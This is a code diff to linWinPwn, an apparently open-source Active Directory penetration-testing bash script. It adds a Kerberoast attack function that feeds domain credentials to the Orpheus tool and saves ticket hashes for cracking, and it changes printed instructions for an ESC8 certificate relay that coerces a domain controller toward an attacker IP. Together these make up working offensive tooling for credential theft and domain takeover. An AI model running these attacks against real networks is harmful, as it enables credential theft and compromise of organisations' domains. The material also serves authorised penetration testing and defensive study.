@@ -90,6 +90,7 @@ rdwatool=$(which rdwatool)
 aced="$scripts_dir/aced-main/aced.py"
 sccmhunter="$scripts_dir/sccmhunter-main/sccmhunter.py"
 ldapper="$scripts_dir/ldapper.py"
+orpheus="$scripts_dir/orpheus-main/orpheus.py"
 krbjack=$(which krbjack)
 nmap=$(which nmap)
 john=$(which john)
@@ -102,7 +103,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.9.3 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.9.4 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -1073,7 +1074,7 @@ adcs_vuln_parse (){
         for vulntemp in $esc8_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -ca ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} relay -target http://${dc_ip}"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${i} -l $attacker_IP --dc-ip $dc_ip"
         done
@@ -1476,6 +1477,24 @@ krbjack_attack () {
             echo -e "${krbjack} --dc-ip ${dc_ip} --domain ${domain} --target-name ${dc_NETBIOS} --ports 139,445 --executable <PATH_TO_EXECUTABLE_TO_RUN>"
         fi
     fi
+    echo -e ""
+}
+
+kerborpheus_attack () {
+    if [ ! -f "${orpheus}" ]; then
+        echo -e "${RED}[-] orpheus.py not found! Please verify the installation of orpheus${NC}"
+    else
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] orpheus requires credentials${NC}"
+        else
+            echo -e "${BLUE}[*] Kerberoast Attack using Orpheus${NC}"
+            current_dir=$(pwd)
+            cd ${scripts_dir}/orpheus-main
+            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt" >> $command_log
+            (echo -e "cred ${argument_imp}\ndcip ${dc_ip}\nfile ${output_dir}/Kerberos/orpheus_kerberoast_hashes_${dc_domain}.txt\n enc 18\n hex 0x40AC0010"; cat /dev/tty) | ${orpheus} | tee -a ${output_dir}/Kerberos/orpheus_output_${dc_domain}.txt
+            cd ${current_dir}
+        fi
+    fi 
     echo -e ""
 }
 
@@ -2645,6 +2664,7 @@ kerberos_menu () {
     echo -e "7) Cracking AS REP Roast hashes using john the ripper"
     echo -e "8) Cracking Kerberoast hashes using john the ripper"
     echo -e "9) AP-REQ hijack with DNS unsecure updates abuse using krbjack"
+    echo -e "10) Run custom Kerberoast attack using Orpheus"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2699,6 +2719,12 @@ kerberos_menu () {
         krbjack_attack
         kerberos_menu
         ;;
+
+        10)
+        kerborpheus_attack
+        kerberos_menu
+        ;;
+
         99)
         main_menu
         ;;
@@ -3563,6 +3589,7 @@ config_menu () {
         if [ ! -f "${sccmhunter}" ] ; then echo -e "${RED}[-] sccmhunter is not installed${NC}"; else echo -e "${GREEN}[+] sccmhunter is installed${NC}"; fi
         if [ ! -f "${krbjack}" ] ; then echo -e "${RED}[-] krbjack is not installed${NC}"; else echo -e "${GREEN}[+] krbjack is installed${NC}"; fi
         if [ ! -f "${ldapper}" ] ; then echo -e "${RED}[-] ldapper is not installed${NC}"; else echo -e "${GREEN}[+] ldapper is installed${NC}"; fi
+        if [ ! -f "${orpheus}" ] ; then echo -e "${RED}[-] orpheus is not installed${NC}"; else echo -e "${GREEN}[+] orpheus is installed${NC}"; fi
         config_menu
         ;;
 
